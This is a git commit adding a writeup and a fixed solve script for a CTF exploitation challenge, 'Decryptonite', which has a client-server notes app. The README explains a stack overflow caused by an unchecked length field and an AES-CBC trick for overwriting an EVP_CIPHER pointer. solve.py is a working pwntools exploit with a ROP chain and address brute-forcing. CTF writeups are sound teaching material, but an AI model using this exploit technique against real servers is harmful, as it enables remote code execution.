6f4c0d81a2afd29c83636c491ade037391e702e2
BobbySinclusto <allencbenjamin@gmail.com>
2025-05-28 09:36:29 -0400

    fix solution and writeup

--- challenges/crypto/decryptonite/solution/README.md
+++ challenges/crypto/decryptonite/solution/README.md
@@ -1,4 +1,53 @@
 # Decryptonite Writeup
 
-Please see details in solve script. It works but is very finicky right now and only works on my machine. I need to update it so it works on more platforms and I'll finish the writeup once that happens.
+> Your notes are secured with state-of-the-art end-to-end encryption. Just don't ask too many questions about what happens after they arrive.
 
+The provided binaries implement a CLI-based notes application. The server binary implements a notes server which the client binary can connect to and send notes for temporary storage. We can add notes (up to 10 notes) and view existing notes. When adding a note, the text we put in is encrypted with a random key and initialization vector and then sent to the server, along withe initialization vector and key used to encrypt the field and the length of the original message.
+
+```
+❯ docker run --rm -it -p 8888:8888 --privileged decryptonite
+Listening on port 8888
+```
+
+```
+❯ docker run --rm -it -v $PWD:/w -w /w --network host decryptonite bash
+root@docker-desktop:/w# ./decryptonite_client -c 127.0.0.1 -p 8888
+1. List notes
+2. Add a note
+Choose an option (1-2): 2
+Enter note to save: hello world
+1. List notes
+2. Add a note
+Choose an option (1-2): 1
+------------- Notes -------------
+1. hello world
+---------------------------------
+```
+
+## Decrypt out-of-bounds
+The length field of the message is not checked and can be set to whatever value we want, causing decryption to progress past the end of the input buffer. The decrypted output is copied into the same buffer where the encrypted message is stored, so we have a stack buffer overflow!
+
+## Exploit strategy
+Even though we have a buffer overflow, we don't have much control over the resulting decryption of the data outside our buffer... OR DO WE?!!
+
+As it turns out, when AES is operating in CBC mode, the decryption of the block depends on the previous ciphertext block, which we do have control over! The decryption of the block is as follows:
+
+```
+ptxt_block = prev_ctxt_block ^ F'(cur_ctxt_block, key)
+```
+
+Where `F'` is the inverse AES function. If we can predict the value of the out-of-bounds ciphertext block, we can control how it gets decrypted by altering the last controlled ciphertext block according to this formula. Using GDB we can tell that the `EVP_CIPHER_CTX` object is right after the end of the message buffer, and its first component is the pointer to the `EVP_CIPHER` used in the encryption. We can use our controlled overflow to gain control over the least significant 4 bytes of the pointer and point it to a fake cipher object!
+
+Lucky for us, the `EVP_CIPHER` pointer that we can overwrite is used by the `EVP_CIPHER_CTX_cleanup` function, where the `cleanup` field (offset 0x28 in the `EVP_CIPHER` struct) is called in order to perform special cleanup operations for the cipher. This is normally set to NULL for `EVP_aes_128_cbc`, but we can set it to the first ROP gadget in our chain instead to get RCE.
+
+## Exploit workflow
+Putting it all together, the solution is as follows (see solve.py for details):
+
+1. Prepare a fake `EVP_CIPHER` object at the start of the buffer where offset 0x28 is a pointer to a ROP gadget that moves the stack pointer down into the buffer
+2. Place ROP gadgets for opening the flag and sending it over the existing network socket at appropriate offsets in the buffer
+3. Fill up to offset 1008 in the buffer with padding
+4. Encrypt the first part of the buffer using whatever IV and key (doesn't matter)
+5. Calculate the value needed for the last block using the CBC decryption trick. We want to overwrite the `EVP_CIPHER` pointer with a pointer to the fake object we created at the start of our buffer. My script bruteforces this, but it should be somewhere around `0x7fffffffe6c4`.
+6. Fill up the rest of the message buffer with null bytes (up to 1028 bytes)
+7. Send the encrypted message in the format iv + key + length + message
+8. Receive from the socket to get the flag!
--- challenges/crypto/decryptonite/solution/solve.py
+++ challenges/crypto/decryptonite/solution/solve.py
@@ -6,14 +6,13 @@ import argparse
 parser = argparse.ArgumentParser(description="Exploit for Decryptonite.")
 parser.add_argument("-t", "--target", default="127.0.0.1", help="ip of target")
 parser.add_argument("-p", "--port", type=int, default=8888, help="port of target")
+parser.add_argument("--timeout", type=int, default=1, help="timeout in seconds for some operations")
 args = parser.parse_args()
 
 context.arch = 'amd64'
 libc = ELF('./libc-2.23.so')
 libc.address = 0x7ffff75c8000
 rop = ROP(libc)
-
-p = remote(args.target, args.port)
 
 def enc(key, iv, msg):
     return AES.new(key, AES.MODE_CBC, iv).encrypt(msg)
@@ -30,51 +29,68 @@ def xor(a, b):
 #   16 iv
 #   16 key
 #    8 len
-# 1024 msg
+# 1028 msg
 
-# Message type and length
-p.send(b'a' + f'{1064:06d}'.encode() + b'\x00')
+for i in range(256):
+    # Brute force the address of the buffer on the server
+    # Start in the middle and work out, buffer should be somewhere around
+    i = 0x6c + (i // 2) * ((i % 2) * 2 - 1)
+    buf_addr = 0x7fffffffe004 + i * 0x10
+    try:
+        p = remote(args.target, args.port)
 
-# Prepare message
-iv = b'A' * 16
-key = b'B' * 16
-length = 1040
+        # Message type and length
+        p.send(b'a' + f'{1064:06d}'.encode() + b'\x00')
 
-# First part of payload
-# Create a fake cipher object on the stack. cipher.cleanup is at offset 0x28.
-unenc = b'/flag.txt'
-unenc = unenc.ljust(0x28, b'\x00')
-# Start by updating the stack pointer into the buffer we control
-unenc += p64(0x7ffff75e89be)  # 0x00007ffff75e89be: add rsp, 0x98; ret;
-# 0x98 - 0x5c = 0x3c
-unenc = unenc.ljust(0x3c, b'\x00')
-buf_addr = 0x7fffffffe6c4
-print(f'{hex(buf_addr)=}')
-# Use rop module to send the flag
-rop.call('open', [buf_addr, 0])
-rop.call('read', [3, buf_addr, 100])
-rop.call('write', [4, buf_addr, 100])
-print(rop.dump())
-unenc += rop.chain()
-print(f'{hex(len(unenc))=}')
+        # Prepare message
+        iv = b'A' * 16
+        key = b'B' * 16
+        length = 1040
 
-# unenc = unenc.ljust(1008 - 100, b'\x00')
-# unenc += b'/flag.txt\x00'
-unenc = unenc.ljust(1008, b'\x00')
-payload = enc(key, iv, unenc)
+        # First part of payload
+        # Create a fake cipher object on the stack. cipher.cleanup is at offset 0x28.
+        unenc = b'/flag.txt'
+        unenc = unenc.ljust(0x28, b'\x00')
+        # Start by updating the stack pointer into the buffer we control
+        unenc += p64(0x7ffff75e89be)  # 0x00007ffff75e89be: add rsp, 0x98; ret;
+        # 0x98 - 0x5c = 0x3c
+        unenc = unenc.ljust(0x3c, b'\x00')
+        print(f'{hex(buf_addr)=}')
+        # Use rop module to send the flag
+        rop.call('open', [buf_addr, 0])
+        rop.call('read', [3, buf_addr, 100])
+        rop.call('write', [4, buf_addr, 100])
+        # print(rop.dump())
+        unenc += rop.chain()
+        print(f'{hex(len(unenc))=}')
 
-# Block before overflow (part of the pointer to ctx object)
-overflow_ctxt = b'\x00'*12 + b'\xa0\xa0\xdb\xf7'
-# Calculate inverse AES
-tmp = dec(key, b'\x00'*16, overflow_ctxt)
-# XOR with desired value (pointer to fake cipher object on stack)
-last_block = xor(tmp, b'A'*12 + b'\xc4\xe6\xff\xff')
+        unenc = unenc.ljust(1008, b'\x00')
+        payload = enc(key, iv, unenc)
 
-payload += last_block
-# Pad with zero bytes up to 1028
-payload += b'\x00'*4
+        # Block before overflow (part of the pointer to ctx object)
+        overflow_ctxt = b'\x00'*12 + b'\xa0\xa0\xdb\xf7'
+        # Calculate inverse AES
+        tmp = dec(key, b'\x00'*16, overflow_ctxt)
+        # XOR with desired value (pointer to fake cipher object on stack)
+        last_block = xor(tmp, b'A'*12 + p64(buf_addr)[:4])
 
-message = iv + key + p32(length) + payload
-p.send(message)
+        payload += last_block
+        # Pad with zero bytes up to 1028
+        payload += b'\x00'*4
 
-p.interactive()
+        message = iv + key + p32(length) + payload
+        p.send(message)
+        flag = b''
+        try:
+            flag = p.recv(timeout=args.timeout)
+            print(flag)
+        except:
+            pass
+        if b'SVUSCG{' in flag:
+            print()
+            import re
+            print(re.search(r'(SVUSCG{.*})', flag.decode(errors='ignore')).group(1))
+            break
+    except:
+        pass
+    p.close()
